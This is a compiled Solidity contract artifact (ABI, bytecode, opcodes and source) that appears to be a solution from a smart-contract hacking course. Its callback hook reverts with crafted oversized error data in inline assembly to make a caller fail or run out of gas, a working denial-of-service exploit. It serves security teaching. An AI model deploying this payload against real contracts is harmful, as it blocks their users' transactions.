{
  "abi": [
    {
      "inputs": [],
      "name": "allowExecution",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "beforeExecution",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "flipSwitch",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "608060405234801561001057600080fd5b5060e58061001f6000396000f3fe6080604052348015600f57600080fd5b5060043610603c5760003560e01c80634f0c8fdf1460415780636e78563514605957806391a4188814605f575b600080fd5b60576000805460ff19811660ff90911615179055565b005b6057607f565b600054606b9060ff1681565b604051901515815260200160405180910390f35b60005460ff1615608b57565b60405162461bcd60e51b8152601c600482015264174876e800604082015261012081fdfea2646970667358221220795d7c62660bb106c32166651b33e563b190aa8e5980fb0efe59c1ace7e624ba64736f6c63430008130033",
  "bytecodeSha1": "9af01ab8af028a2657780d8f13f7a71c824f6950",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "AttackContractSolvedAdvanced",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x3C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4F0C8FDF EQ PUSH1 0x41 JUMPI DUP1 PUSH4 0x6E785635 EQ PUSH1 0x59 JUMPI DUP1 PUSH4 0x91A41888 EQ PUSH1 0x5F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x57 PUSH1 0x0 DUP1 SLOAD PUSH1 0xFF NOT DUP2 AND PUSH1 0xFF SWAP1 SWAP2 AND ISZERO OR SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH1 0x57 PUSH1 0x7F JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x6B SWAP1 PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD PUSH1 0xFF AND ISZERO PUSH1 0x8B JUMPI JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x1C PUSH1 0x4 DUP3 ADD MSTORE PUSH5 0x174876E800 PUSH1 0x40 DUP3 ADD MSTORE PUSH2 0x120 DUP2 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH26 0x5D7C62660BB106C32166651B33E563B190AA8E5980FB0EFE59C1 0xAC 0xE7 0xE6 0x24 0xBA PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER ",
  "sha1": "0b5cb94ef619448513cecd4e5c9d61dd19f5c01a",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"../../interfaces/ICallbackContract.sol\";\nimport \"hardhat/console.sol\";\n\ncontract AttackContractSolvedAdvanced {\n    bool public allowExecution;\n\n    function flipSwitch() public {\n        allowExecution = !allowExecution;\n    }\n\n    function beforeExecution() external {\n        if (allowExecution) return;\n\n        assembly {\n            let free_mem_ptr := mload(0x40)\n            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)\n            mstore(add(free_mem_ptr, 0x04), 28)\n            mstore(add(free_mem_ptr, 0x40), 100000000000) // out of gas\n            revert(free_mem_ptr, 0x120)\n        }\n    }\n}\n",
  "sourcePath": "contracts/solution/AttackContractSolvedAdvanced.sol",
  "type": "contract"
}